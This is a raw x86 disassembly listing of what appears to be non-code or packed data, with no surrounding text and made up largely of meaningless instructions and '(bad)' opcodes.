  41dbb5:	mov    ds:0x87b7cb5c,eax
  41dbba:	add    dl,bh
  41dbbc:	cdq    
  41dbbd:	add    DWORD PTR [eax],eax
  41dbbf:	lods   al,BYTE PTR ds:[esi]
  41dbc0:	add    BYTE PTR [eax],al
  41dbc2:	add    dh,cl
  41dbc4:	inc    ebp
  41dbc5:	fimul  DWORD PTR [eax+0x79ee9795]
  41dbcb:	sbb    DWORD PTR [esi],ecx
  41dbcd:	xor    BYTE PTR [ebp-0x49],cl
  41dbd0:	rcl    DWORD PTR [ecx+ebx*2-0x4589670c],cl
  41dbd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbd8:	push   ebp
  41dbd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbda:	repz fdiv DWORD PTR [ebp+0x4e93dbfd]
  41dbe1:	lahf   
  41dbe2:	das    
  41dbe3:	xor    cl,BYTE PTR [ebx+0x4b47ec2]
  41dbe9:	sub    eax,0x558509bc
  41dbee:	sub    ecx,esp
  41dbf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbf1:	aam    0x90
  41dbf3:	loopne 0x41dc59
  41dbf5:	mov    eax,0x7ee45db3
  41dbfa:	lods   eax,DWORD PTR ds:[esi]
  41dbfb:	rcl    DWORD PTR cs:[edi-0x6b],0x1d
  41dc00:	jb     0x41dbd0
  41dc02:	xor    BYTE PTR [ebx],dh
  41dc04:	or     DWORD PTR [edx-0x55],esp
  41dc07:	aaa    
  41dc08:	pushf  
  41dc09:	xchg   ebx,eax
  41dc0a:	ja     0x41dc3c
  41dc0c:	jnp    0x41dbf6
  41dc0e:	out    0xae,eax
  41dc10:	add    ecx,ebp
  41dc12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc13:	push   ds
  41dc14:	js     0x41dc50
  41dc16:	sbb    BYTE PTR [ebp+0x23ad3fe4],ah
  41dc1c:	adc    edi,esi
  41dc1e:	adc    al,0x43
  41dc20:	std    
  41dc21:	call   0xcf0c44f1
  41dc26:	sub    DWORD PTR [ebx+0x22484dd1],0xffffff90
  41dc2d:	nop
  41dc2e:	loop   0x41dbbd
  41dc30:	mov    ebx,0xb355fb1a
  41dc35:	push   edi
  41dc36:	out    dx,al
  41dc37:	jg     0x41dc02
  41dc39:	std    
  41dc3a:	inc    DWORD PTR [eax-0x4485fa70]
  41dc40:	inc    edx
  41dc41:	ins    DWORD PTR es:[edi],dx
  41dc42:	or     esp,DWORD PTR [edi+0x1a]
  41dc45:	sbb    esp,DWORD PTR [eax-0x27]
  41dc48:	retf   0x21d
  41dc4b:	and    al,0x41
  41dc4d:	jl     0x41dc80
  41dc4f:	lahf   
  41dc50:	call   0x374a:0x88748016
  41dc57:	int    0xc4
  41dc59:	add    ebx,esi
  41dc5b:	aad    0x99
  41dc5d:	mov    eax,ds:0x3eed691e
  41dc62:	(bad)  
  41dc63:	fmul   DWORD PTR [esp+ebx*8+0x59fd8ee2]
  41dc6a:	dec    ebx
  41dc6b:	out    dx,al
  41dc6c:	test   al,0xf5
  41dc6e:	aaa    
	...
  41dc7b:	dec    eax
  41dc7c:	in     al,0x3
  41dc7e:	fwait
  41dc7f:	scas   eax,DWORD PTR es:[edi]
  41dc80:	(bad)  
  41dc81:	fdiv   st,st(7)
  41dc83:	pop    esi
  41dc84:	sub    BYTE PTR [eax-0x6c5d5e71],bl
  41dc8a:	daa    
  41dc8b:	sbb    DWORD PTR [edx+0xac0001],0x0
  41dc92:	add    BYTE PTR [ecx+0x7911ec71],ch
  41dc98:	jle    0x41dc69
  41dc9a:	or     eax,DWORD PTR [edx+0x72545cc1]
  41dca0:	(bad)  
  41dca1:	fstp   TBYTE PTR ds:0xe66feab9
  41dca7:	and    DWORD PTR [ebx+edx*1],eax
  41dcaa:	test   DWORD PTR [esi],ebx
  41dcac:	jns    0x41dc64
  41dcae:	mov    bh,0x82
  41dcb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcb1:	mov    dl,0xd7
  41dcb3:	cmp    DWORD PTR [ebx+eiz*1-0x58],esi
  41dcb7:	pop    edi
  41dcb8:	mov    BYTE PTR [ebx],dl
  41dcba:	mov    eax,ds:0xc81a6912
  41dcbf:	fisubr DWORD PTR [edi+0x50]
  41dcc2:	sbb    al,0x6d
  41dcc4:	mov    edx,0x39bb37d7
  41dcc9:	cdq    
  41dcca:	sub    BYTE PTR ds:0xb50d80db,dh
  41dcd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcd1:	call   0x58a8:0xb96ae9c9
  41dcd8:	icebp  
  41dcd9:	mov    bl,0x5
  41dcdb:	ret    
  41dcdc:	jb     0x41dc66
  41dcde:	pop    es
  41dcdf:	xor    BYTE PTR ds:0x72656b59,ah
  41dce5:	fwait
  41dce6:	std    
  41dce7:	arpl   WORD PTR [edi+ebx*8+0x7],si
  41dceb:	test   dl,al
  41dced:	xchg   ebx,eax
  41dcee:	fcom   QWORD PTR [ebp-0x3c]
  41dcf1:	fstp   QWORD PTR [ebx+0x74d1a93d]
  41dcf7:	xor    eax,0x77e552e
  41dcfc:	inc    edx
  41dcfd:	mov    ebp,0xaacc0316
  41dd02:	adc    BYTE PTR [ebp+edx*4+0x208aa46e],0x22
  41dd0a:	and    al,0x94
  41dd0c:	cmp    BYTE PTR ds:0x241879a7,ch
  41dd12:	dec    edx
  41dd13:	scas   eax,DWORD PTR es:[edi]
  41dd14:	call   0xd5dd:0x86130ef9
  41dd1b:	and    al,0xd1
  41dd1d:	mov    al,ds:0xe708624
  41dd22:	adc    BYTE PTR [eax-0x79874bab],al
  41dd28:	scas   eax,DWORD PTR es:[edi]
  41dd29:	repnz add DWORD PTR [ebx+0x2a],ebx
  41dd2d:	mov    dl,BYTE PTR [esp+edx*4-0xe]
  41dd31:	(bad)  
  41dd32:	jecxz  0x41dcf5
  41dd34:	fist   DWORD PTR [edx+0x65]
  41dd37:	inc    esp
  41dd38:	mov    esi,ebp
  41dd3a:	test   al,0xd2
  41dd3c:	pop    esi
  41dd3d:	dec    ebp
  41dd3e:	xchg   DWORD PTR [eax],eax
	...
  41dd48:	add    BYTE PTR [eax],al
  41dd4a:	add    BYTE PTR [edx+0x4],dl
  41dd4d:	mov    ds:0x72a6f682,al
  41dd52:	aam    0x6d
  41dd54:	xor    dh,BYTE PTR [edx]
  41dd56:	and    eax,0x39d9eb45
  41dd5b:	das    
  41dd5c:	fwait
  41dd5d:	add    DWORD PTR [eax],eax
  41dd5f:	lods   al,BYTE PTR ds:[esi]
  41dd60:	add    BYTE PTR [eax],al
  41dd62:	add    BYTE PTR [eax-0x2bad0f],ch
  41dd68:	cmp    al,0xe6
  41dd6a:	dec    esi
  41dd6b:	adc    ebx,edi
  41dd6d:	or     ebx,DWORD PTR [ecx+esi*1]
  41dd70:	pop    esp
  41dd71:	push   ebx
  41dd72:	sub    eax,esp
  41dd74:	jo     0x41dd50
  41dd76:	pop    ebx
  41dd77:	ret    
  41dd78:	pop    esp
  41dd79:	inc    ecx
  41dd7a:	add    al,0x40
  41dd7c:	aam    0x54
  41dd7e:	test   esp,0x4d28ebb
  41dd84:	xor    al,0x1
  41dd86:	push   eax
  41dd87:	mov    eax,0x1bf9881c
  41dd8c:	push   es
  41dd8d:	add    eax,0x3c839f4b
  41dd92:	sti    
  41dd93:	inc    ecx
  41dd94:	lea    ecx,[edx-0x1c]
  41dd97:	ins    BYTE PTR es:[edi],dx
  41dd98:	das    
  41dd99:	hlt    
  41dd9a:	loopne 0x41dd84
  41dd9c:	push   esp
  41dd9d:	sub    eax,0xe5213aa0
  41dda2:	sub    BYTE PTR [eax],ch
  41dda4:	iret   
  41dda5:	in     eax,dx
  41dda6:	or     al,0xa7
  41dda8:	(bad)  
  41dda9:	aas    
  41ddaa:	mov    bh,0x95
  41ddac:	mov    esi,0xbda45609
  41ddb1:	xchg   edi,eax
  41ddb2:	ror    BYTE PTR [esp+eiz*4-0x1d],1
  41ddb6:	arpl   WORD PTR [ebp-0x3f8cd7f0],cx
  41ddbc:	fs in  al,0xd0
  41ddbf:	xchg   esp,eax
  41ddc1:	mov    ch,BYTE PTR [ecx+0x73]
  41ddc4:	mov    esi,0x72d72a87
  41ddc9:	jmp    0xc476e369
  41ddce:	pop    ss
  41ddcf:	lods   eax,DWORD PTR ds:[esi]
  41ddd0:	mov    edx,0x372f219a
  41ddd5:	popf   
  41ddd6:	loop   0x41ddbf
  41ddd8:	test   eax,0xbef22b49
  41dddd:	nop
  41ddde:	cmp    BYTE PTR [esi+0x22],ah
  41dde1:	jbe    0x41dd66
  41dde3:	xchg   esp,eax
  41dde4:	fld    TBYTE PTR [ebx]
  41dde6:	lock call 0x5b5c:0xa6be4c65
  41ddee:	out    0xe2,eax
  41ddf0:	pusha  
  41ddf1:	sbb    BYTE PTR [edx+0xd148195],bh
  41ddf7:	(bad)  
  41ddf8:	xchg   ebp,eax
  41ddf9:	mov    al,ds:0x27e62eb6
  41ddfe:	or     DWORD PTR [esi],0x78185533
  41de04:	mov    ds:0x578bcef4,eax
  41de09:	mov    ds:0x8e59ea95,al
  41de0e:	mov    al,BYTE PTR [eax]
	...
  41de18:	add    BYTE PTR [eax],al
  41de1a:	add    BYTE PTR [eax],bh
  41de1c:	push   0xffffff96
  41de1e:	add    edx,esi
  41de20:	(bad)  
  41de21:	mov    ebp,0xdb4ef67b
  41de26:	out    0x1b,eax
  41de28:	push   eax
  41de29:	xor    BYTE PTR [ebx+ebx*8-0x53fffe65],ch
  41de30:	add    BYTE PTR [eax],al
  41de32:	add    dh,bh
  41de34:	fimul  WORD PTR [ebx-0x19]
  41de37:	sbb    BYTE PTR [ebx+0x34],dh
  41de3a:	pop    es
  41de3b:	add    BYTE PTR [ebp+0x49],ah
  41de3e:	scas   eax,DWORD PTR es:[edi]
  41de3f:	dec    DWORD PTR [ebx]
  41de41:	stos   BYTE PTR es:[edi],al
  41de42:	bound  esp,QWORD PTR [ebx+esi*2+0x61]
  41de46:	mov    cl,0xad
  41de48:	mov    ah,0x25
  41de4a:	cmp    BYTE PTR [ebx+0x7cf3fa07],dh
  41de50:	xor    DWORD PTR [ebx],0xffffffcd
  41de53:	push   eax
  41de54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de55:	test   BYTE PTR [ecx-0xf],cl
  41de58:	test   al,0x75
  41de5a:	mov    esp,0x644530
  41de5f:	fcomp  DWORD PTR [ebx+0x1e0db18]
  41de65:	scas   al,BYTE PTR es:[edi]
  41de66:	sub    eax,0xd7b6ae05
  41de6b:	fnstenv [ebp-0x13]
  41de6e:	push   0x36db28a3
  41de73:	call   0x30f7:0x1a374e8d
  41de7a:	add    al,0x8a
  41de7c:	pop    ss
  41de7d:	xchg   ah,bl
  41de7f:	dec    ebx
  41de80:	pop    ds
  41de81:	retf   
  41de82:	ins    BYTE PTR es:[edi],dx
  41de83:	sar    DWORD PTR [esi+ebp*2+0x44],1
  41de87:	xor    eax,0xec73e6bc
  41de8c:	xor    edx,DWORD PTR [eax+0x1cf21a20]
  41de92:	cmp    edi,esp
  41de94:	pop    edi
  41de95:	cli    
  41de96:	add    DWORD PTR [edx+0x4d],eax
  41de99:	sti    
  41de9a:	mov    ss,WORD PTR [edi+0x63]
  41de9d:	xchg   DWORD PTR [esp+eiz*2],ebx
  41dea0:	jge    0x41de97
  41dea2:	aas    
  41dea3:	lahf   
  41dea4:	out    dx,al
  41dea5:	in     al,dx
  41dea6:	or     ax,0x8c48
  41deaa:	sub    eax,0x8e788bfa
  41deaf:	jb     0x41dee0
  41deb1:	fbstp  TBYTE PTR [edx]
  41deb3:	ret    
  41deb4:	xchg   esp,eax
  41deb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41deb6:	push   esp
  41deb7:	cwde   
  41deb8:	push   ebp
  41deb9:	add    DWORD PTR [esi-0x2],esi
  41debc:	test   eax,0x9ee19e72
  41dec1:	or     DWORD PTR [esi+0x51],esp
  41dec4:	lods   eax,DWORD PTR ds:[esi]
  41dec5:	aam    0x64
  41dec7:	lods   eax,DWORD PTR ds:[esi]
  41dec8:	mov    ecx,0xeee302de
  41decd:	sahf   
  41dece:	cld    
  41decf:	mov    bl,0xb0
  41ded1:	fs cmc 
  41ded3:	shl    BYTE PTR [ecx],1
  41ded5:	cli    
  41ded6:	push   ecx
  41ded7:	lea    esp,[edx-0x45d18195]
  41dedd:	fadd   DWORD PTR [ebx+0x0]
	...
  41dee8:	add    BYTE PTR [eax],al
  41deea:	add    cl,ch
  41deec:	mov    ecx,0xf37a307a
  41def1:	jmp    0x41deec
  41def3:	fimul  DWORD PTR [esp+eax*2+0x6c]
  41def7:	jmp    0x876d0fd0
  41defc:	pushf  
  41defd:	add    DWORD PTR [eax],eax
  41deff:	lods   al,BYTE PTR ds:[esi]
  41df00:	add    BYTE PTR [eax],al
  41df02:	add    ch,ah
  41df04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df05:	and    al,0xdb
  41df07:	or     al,dh
  41df09:	rcl    ah,0x72
  41df0c:	pop    ecx
  41df0d:	in     al,dx
  41df0e:	cmp    DWORD PTR fs:[edx],0xce5e864e
  41df15:	cmp    cl,dl
  41df17:	sbb    BYTE PTR [edx-0x61d909be],dh
  41df1d:	and    ebx,DWORD PTR [ecx]
  41df1f:	and    edi,eax
  41df21:	push   esi
  41df22:	xor    ebp,DWORD PTR [ecx-0x68]
  41df25:	or     esi,DWORD PTR [ecx+0x7b995acd]
  41df2b:	cmc    
  41df2c:	maxps  xmm2,XMMWORD PTR [edi+0x0]
  41df30:	add    ch,BYTE PTR [ecx]
  41df32:	(bad)  
  41df33:	punpcklwd mm3,DWORD PTR ss:[ebx+0x72]
  41df38:	in     eax,0xa7
  41df3a:	mov    BYTE PTR ds:0xd95a4000,ah
  41df40:	sbb    eax,0xfac721db
  41df45:	neg    dh
  41df47:	lahf   
  41df48:	push   ecx
  41df49:	in     al,0xe3
  41df4b:	retf   0x5527
  41df4e:	sbb    dh,BYTE PTR [edx]
  41df50:	dec    esi
  41df51:	rcl    DWORD PTR [ebx-0x58],1
  41df54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df55:	dec    ah
  41df57:	cdq    
  41df58:	ins    DWORD PTR es:[edi],dx
  41df59:	lock dec ecx
  41df5b:	(bad)  
  41df5c:	fs push esi
  41df5e:	xchg   ebx,eax
  41df5f:	mov    dl,0x52
  41df61:	out    dx,al
  41df62:	leave  
  41df63:	mov    WORD PTR [esi+0x3c931087],ds
  41df69:	ds mov esi,0x64b02dc8
  41df6f:	hlt    
  41df70:	fild   DWORD PTR [ecx]
  41df72:	add    al,0xa8
  41df74:	shl    esp,1
  41df76:	jecxz  0x41df80
  41df78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df79:	cwde   
  41df7a:	ret    0xeacc
  41df7d:	test   al,0xe0
  41df7f:	outs   dx,DWORD PTR ds:[esi]
  41df80:	ja     0x41df0d
  41df82:	out    dx,eax
  41df83:	out    0xbb,eax
  41df85:	xchg   edi,eax
  41df86:	mov    ?,WORD PTR [edi]
  41df88:	stos   BYTE PTR es:[edi],al
  41df89:	mov    esp,eax
  41df8b:	push   eax
  41df8c:	popa   
  41df8d:	in     al,0x85
  41df8f:	sub    esp,0x1d1ddc81
  41df95:	cmc    
  41df96:	fcmovnbe st,st(1)
  41df98:	imul   edi
  41df9a:	fmul   st(0),st
  41df9c:	jg     0x41dfbc
  41df9e:	adc    edi,ebx
  41dfa0:	jne    0x41df51
  41dfa2:	orps   xmm6,xmm4
  41dfa5:	cmp    bl,ah
  41dfa7:	in     eax,dx
  41dfa8:	cmp    al,0xa
  41dfaa:	(bad)  ds:0x5875c2
	...
  41dfb8:	add    BYTE PTR [eax],al
  41dfba:	add    BYTE PTR [ebx+0x41],bl
  41dfbd:	pop    ebx
  41dfbe:	iret   
  41dfbf:	pop    ebx
  41dfc0:	(bad)  
  41dfc2:	aad    0xf
  41dfc4:	ss dec esp
  41dfc6:	dec    esi
  41dfc7:	fisttp QWORD PTR [eax]
  41dfc9:	pop    edx
  41dfca:	hlt    
  41dfcb:	xor    ebx,DWORD PTR [ebp+0xac0001]
  41dfd1:	add    BYTE PTR [eax],al
  41dfd3:	or     al,0x2e
  41dfd5:	xor    DWORD PTR [ecx+0x758a99b4],ebx
  41dfdb:	outs   dx,BYTE PTR ds:[esi]
  41dfdc:	shl    DWORD PTR [eax],cl
  41dfde:	push   es
  41dfdf:	fxtract 
  41dfe1:	push   esp
  41dfe2:	scas   al,BYTE PTR es:[edi]
  41dfe3:	dec    edx
  41dfe4:	test   eax,0xbf2fea9c
  41dfe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfea:	push   ds
  41dfeb:	jb     0x41df79
  41dfed:	shr    BYTE PTR [edx-0x2],0xa6
  41dff1:	xchg   ecx,eax
  41dff2:	pop    edx
  41dff3:	fs fs jns 0x41df99
  41dff7:	icebp  
  41dff8:	inc    esp
  41dff9:	imul   esp,DWORD PTR [edi+0x3e],0x42
  41dffd:	or     BYTE PTR [edi-0x12685b1b],ah
  41e003:	aaa    
  41e004:	ds ds loopne 0x41dfd2
  41e008:	daa    
  41e009:	pop    ecx
  41e00a:	cmp    al,0xb7
  41e00c:	test   BYTE PTR [ecx],al
  41e00e:	cs retf 0x375c
  41e012:	fimul  DWORD PTR [ebp+edx*1+0x4311ed10]
  41e019:	push   esi
  41e01a:	sub    eax,0xac92c6b1
  41e01f:	call   0x7b5b:0xb2bef724
  41e026:	out    0x92,al
  41e028:	jecxz  0x41dff1
  41e02a:	(bad)  
  41e02b:	adc    BYTE PTR [ebx],ah
  41e02d:	das    
  41e02e:	das    
  41e02f:	icebp  
  41e030:	xchg   ecx,eax
  41e031:	pop    es
  41e032:	mov    eax,ds:0xa2b86c8b
  41e037:	out    dx,eax
  41e038:	loop   0x41dfd7
  41e03a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e03b:	pusha  
  41e03c:	dec    esp
  41e03d:	xchg   edi,eax
  41e03e:	fistp  QWORD PTR [ebp-0x6d5cf8a6]
  41e044:	xor    eax,0x983e1b53
  41e049:	lods   al,BYTE PTR ds:[esi]
  41e04a:	adc    ebx,DWORD PTR [ebx+0x1a]
  41e04d:	stos   DWORD PTR es:[edi],eax
  41e04e:	mov    dl,0x53
  41e050:	std    
  41e051:	hlt    
  41e052:	pop    ecx
  41e053:	jmp    0xe5ade4ee
  41e058:	mov    dl,0x3b
  41e05a:	mov    ds:0x3dbc645a,eax
  41e05f:	dec    eax
  41e060:	mov    edi,0x707754f6
  41e065:	jns    0x41e091
  41e067:	dec    edi
  41e068:	(bad)  
  41e069:	out    dx,al
  41e06a:	sub    bh,BYTE PTR [edi-0x2ca3e690]
  41e070:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e071:	daa    
  41e072:	(bad)  
  41e073:	retf   
  41e074:	fs inc ebp
  41e076:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e077:	add    DWORD PTR [ebx+0x4a],0x11b48a64
  41e07e:	mov    esp,0x0
	...
  41e08b:	fwait
  41e08c:	test   DWORD PTR [ebp+0x3c],esp
  41e08f:	jg     0x41e08d
  41e091:	(bad)  [edi-0x65be08a1]
  41e097:	and    dh,bh
  41e099:	add    DWORD PTR ds:0x19ddf,edi
  41e09f:	lods   al,BYTE PTR ds:[esi]
  41e0a0:	add    BYTE PTR [eax],al
  41e0a2:	add    BYTE PTR [ecx],ah
  41e0a4:	int    0xe0
  41e0a6:	xchg   ebx,eax
  41e0a7:	inc    esi
  41e0a8:	ret    
  41e0a9:	inc    eax
  41e0aa:	aam    0x98
  41e0ac:	fistp  WORD PTR [bp-0x7ea1]
  41e0b1:	test   BYTE PTR [esi-0x78],0xbc
  41e0b5:	aaa    
  41e0b6:	fldcw  WORD PTR [ecx+0x1c]
  41e0b9:	sbb    DWORD PTR gs:[edi-0xb404087],edi
  41e0c0:	sub    DWORD PTR [ebx+0x3a375be9],ebx
  41e0c6:	int3   
  41e0c7:	scas   al,BYTE PTR es:[edi]
  41e0c8:	repnz mov eax,ds:0x5714c70f
  41e0ce:	xchg   ebp,eax
  41e0cf:	clc    
  41e0d0:	imul   esi,ebp,0xffffffe8
  41e0d3:	repz push ebx
  41e0d5:	dec    ebp
  41e0d6:	jae    0x41e152
  41e0d8:	outs   dx,BYTE PTR ds:[esi]
  41e0d9:	jmp    0x41e0ec
  41e0db:	pop    edx
  41e0dc:	xchg   ecx,eax
  41e0dd:	(bad)  
  41e0de:	fdivrp st(5),st
  41e0e0:	lea    ecx,[eax+0x4625cb2a]
  41e0e6:	xor    eax,0x182d7d71
  41e0eb:	push   edx
  41e0ec:	loopne 0x41e13a
  41e0ee:	gs hlt 
  41e0f0:	push   esi
  41e0f1:	lods   eax,DWORD PTR ds:[esi]
  41e0f2:	pushf  
  41e0f3:	add    dh,cl
  41e0f5:	rcl    DWORD PTR [eax],1
  41e0f7:	test   BYTE PTR ds:0x6c337fad,dh
  41e0fd:	mov    al,ds:0x62dca57
  41e102:	mov    esi,esp
  41e104:	jno    0x41e0b9
  41e106:	pop    ds
  41e107:	int    0x26
  41e109:	mov    ebp,0x76f4c45d
  41e10e:	xchg   esi,eax
  41e10f:	popf   
  41e110:	pop    esp
  41e111:	std    
  41e112:	and    al,0x4d
  41e114:	lds    ebp,FWORD PTR [ebx]
  41e116:	push   edi
  41e117:	pop    ss
  41e118:	imul   eax
  41e11a:	arpl   WORD PTR [esp+esi*2],bx
  41e11d:	dec    edx
  41e11e:	cmp    ebp,DWORD PTR [ecx-0x59]
  41e121:	push   ebp
  41e122:	test   DWORD PTR [eax-0x54f3023e],eax
  41e128:	jbe    0x41e0d8
  41e12a:	popa   
  41e12b:	push   ebp
  41e12c:	add    BYTE PTR [esi-0x6b383fc2],dl
  41e132:	lea    ebx,[ebp+0x3f]
  41e135:	retf   0x9ccb
  41e138:	push   ss
  41e139:	xor    ebp,esi
  41e13b:	ins    BYTE PTR es:[edi],dx
  41e13c:	data16 jp 0x41e16f
  41e13f:	gs inc esp
  41e141:	mov    al,0x26
  41e143:	adc    ch,ah
  41e145:	outs   dx,BYTE PTR es:[esi]
  41e147:	adc    eax,DWORD PTR [ecx+ebp*4+0x19]
  41e14b:	jecxz  0x41e1a2
  41e14d:	mov    ebx,0x37
	...
  41e15a:	add    BYTE PTR [esi+0x73],ch
  41e15d:	lock retf 0xcbfd
  41e161:	jle    0x41e15a
  41e163:	repz xor eax,0xd34c8ce9
  41e169:	dec    ecx
  41e16a:	iret   
  41e16b:	mov    ebx,DWORD PTR [esi+0xac0001]
  41e171:	add    BYTE PTR [eax],al
  41e173:	aaa    
  41e174:	rcr    DWORD PTR [edi],cl
  41e176:	inc    ebx
  41e177:	sub    cl,ch
  41e179:	sub    eax,0xd4e4289a
  41e17e:	jne    0x41e19c
  41e180:	cmp    BYTE PTR [ecx-0x2e],bl
  41e183:	adc    esi,edx
  41e185:	add    al,0x7b
  41e187:	xchg   edi,eax
  41e188:	loop   0x41e170
  41e18a:	cmc    
  41e18b:	pop    es
  41e18c:	test   al,0x55
  41e18e:	je     0x41e12b
  41e190:	mov    ch,0x37
  41e192:	xchg   edx,eax
  41e193:	mov    ah,0x85
  41e195:	mov    dl,0x4b
  41e197:	lahf   
  41e198:	push   cs
  41e199:	mov    bh,0xca
  41e19b:	(bad)  
  41e19c:	and    DWORD PTR [ecx+0x16],eax
  41e19f:	push   cs
  41e1a0:	call   FWORD PTR [edx-0x7041b40b]
  41e1a6:	fwait
  41e1a7:	jmp    0xbd62f7b0
  41e1ac:	lods   eax,DWORD PTR ds:[esi]
  41e1ad:	stos   BYTE PTR es:[edi],al
  41e1ae:	ret    0x51af
  41e1b1:	outs   dx,BYTE PTR ds:[esi]
  41e1b2:	jne    0x41e14c
  41e1b4:	into   
  41e1b5:	mov    ds:0x9027f453,eax
  41e1ba:	das    
  41e1bb:	leave  
  41e1bc:	(bad)  
  41e1bd:	aas    
  41e1be:	jns    0x41e194
  41e1c0:	jge    0x41e1f2
  41e1c2:	pop    es
  41e1c3:	clc    
  41e1c4:	and    dh,BYTE PTR [ebp-0x3726a3ee]
  41e1ca:	and    eax,0x6aecac98
  41e1cf:	sub    cl,bh
  41e1d1:	popf   
  41e1d2:	sbb    esp,DWORD PTR [eax+0x71]
  41e1d5:	add    al,0x2e
  41e1d7:	ins    DWORD PTR es:[edi],dx
  41e1d8:	scas   al,BYTE PTR es:[edi]
  41e1d9:	push   0xffffffde
  41e1db:	frstor [esi-0xc]
  41e1de:	sbb    BYTE PTR [esi+esi*4+0x57],dh
  41e1e2:	sbb    bh,BYTE PTR [edi-0xf800e0c]
  41e1e8:	mov    BYTE PTR [edi+0x226fd483],dh
  41e1ee:	and    ebx,eax
  41e1f0:	sbb    BYTE PTR [esi+0x7912406c],dl
  41e1f6:	cdq    
  41e1f7:	mov    bl,BYTE PTR [ebp-0x7382d850]
  41e1fd:	xchg   esp,eax
  41e1fe:	jmp    0x753b548c
  41e203:	push   ebx
  41e204:	fwait
  41e205:	inc    edi
  41e206:	addr16 pop ebp
  41e208:	cs xchg ch,bh
  41e20b:	lea    edi,gs:[edx-0x50386a8b]
  41e212:	inc    edx
  41e213:	xor    ch,BYTE PTR [eax+0x512dc767]
  41e219:	lods   eax,DWORD PTR ds:[esi]
  41e21a:	xchg   DWORD PTR [ebp+0xcf92ff],ecx
	...
  41e228:	add    BYTE PTR [eax],al
  41e22a:	add    ch,dh
  41e22c:	adc    al,0xae
  41e22e:	adc    ebp,edi
  41e230:	mov    ebx,0x84e6f6fd
  41e235:	lds    ebp,FWORD PTR [edx-0x7ae2984f]
  41e23b:	aaa    
  41e23c:	lahf   
  41e23d:	add    DWORD PTR [eax],eax
  41e23f:	lods   al,BYTE PTR ds:[esi]
  41e240:	add    BYTE PTR [eax],al
  41e242:	add    BYTE PTR [eax-0x68402172],ah
  41e248:	mov    bl,0x34
  41e24a:	xor    edx,esi
  41e24c:	xchg   ebp,eax
  41e24d:	and    eax,0x9ce0a243
  41e252:	push   0xaea70248
  41e257:	out    0x61,al
  41e259:	loop   0x41e1e5
  41e25b:	(bad)  
  41e25c:	xchg   esi,eax
  41e25d:	popf   
  41e25e:	test   BYTE PTR [edx-0x5c],bl
  41e261:	lds    edi,FWORD PTR [esi+0x597bcd99]
  41e267:	cld    
  41e268:	push   0xffffffab
  41e26a:	hlt    
  41e26b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e26c:	or     dl,ah
  41e26e:	mov    DWORD PTR [ebp-0x34],eax
  41e271:	out    dx,al
  41e272:	dec    edx
  41e273:	sub    ch,BYTE PTR [esi+0x553e564]
  41e279:	jne    0x41e238
  41e27b:	sbb    eax,0x7bd1ce30
  41e280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e281:	retf   
  41e282:	(bad)  
  41e283:	mov    al,0x3e
  41e285:	adc    BYTE PTR [edi+0x77],dl
  41e288:	inc    eax
  41e289:	xor    al,0xaf
  41e28b:	xchg   esp,eax
  41e28c:	cwde   
  41e28d:	(bad)  
  41e28e:	mov    dl,0x21
  41e290:	ins    DWORD PTR es:[edi],dx
  41e291:	sti    
  41e292:	(bad)  
  41e293:	mov    esp,0xbdbe5d64
  41e298:	mov    ah,0x83
  41e29a:	jnp    0x41e23a
  41e29c:	add    al,0xc6
  41e29e:	ss cli 
  41e2a0:	and    DWORD PTR [esi-0x76],0xffffffdc
  41e2a4:	fadd   st(3),st
  41e2a6:	mov    ?,WORD PTR [esi+ecx*8-0x5e]
  41e2aa:	jecxz  0x41e31b
  41e2ac:	fisttp WORD PTR [esi]
  41e2ae:	cmp    BYTE PTR [edi+0x476781f0],0xd5
  41e2b5:	or     ax,WORD PTR [edi+0x239ea8d9]
  41e2bc:	popa   
  41e2bd:	shl    DWORD PTR cs:[ebx-0x46],cl
  41e2c1:	fld    TBYTE PTR [edx-0x75]
  41e2c4:	aad    0xf7
  41e2c6:	in     al,0xa3
  41e2c8:	sub    ecx,DWORD PTR [ebx+0x5e]
  41e2cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2cc:	adc    edx,edi
  41e2ce:	pop    ds
  41e2cf:	pop    esp
  41e2d0:	inc    esp
  41e2d1:	add    dh,BYTE PTR [edi+0x2c]
  41e2d4:	jecxz  0x41e269
  41e2d6:	or     BYTE PTR [esi-0x6481bf38],cl
  41e2dc:	adc    al,0xf1
  41e2df:	stc    
  41e2e0:	jae    0x41e30e
  41e2e2:	pop    ss
  41e2e3:	in     eax,0x7e
  41e2e5:	dec    esi
  41e2e6:	and    cl,ch
  41e2e8:	lahf   
  41e2e9:	push   ebx
  41e2ea:	fwait
  41e2eb:	add    DWORD PTR [ecx+0x2a],esi
  41e2ee:	mov    ch,0x0
	...
  41e2f8:	add    BYTE PTR [eax],al
  41e2fa:	add    BYTE PTR [ebx],bh
  41e2fc:	mov    cl,0x57
  41e2fe:	lock fcomip st,st(6)
  41e301:	mov    edi,0xbb1c16fb
  41e306:	sar    BYTE PTR [eax+0x34],0x33
  41e30a:	call   0x4382f2
  41e30f:	lods   al,BYTE PTR ds:[esi]
  41e310:	add    BYTE PTR [eax],al
  41e312:	add    BYTE PTR [esi+0x256262dd],bh
  41e318:	add    al,0x69
  41e31a:	cmp    al,0x3f
  41e31c:	adc    al,0xce
  41e31e:	push   es
  41e31f:	pop    ecx
  41e320:	cli    
  41e321:	inc    esi
  41e322:	jo     0x41e2a9
  41e324:	sbb    esi,DWORD PTR [ecx]
  41e326:	inc    edx
  41e327:	mov    ebp,0x4b7b2ee8
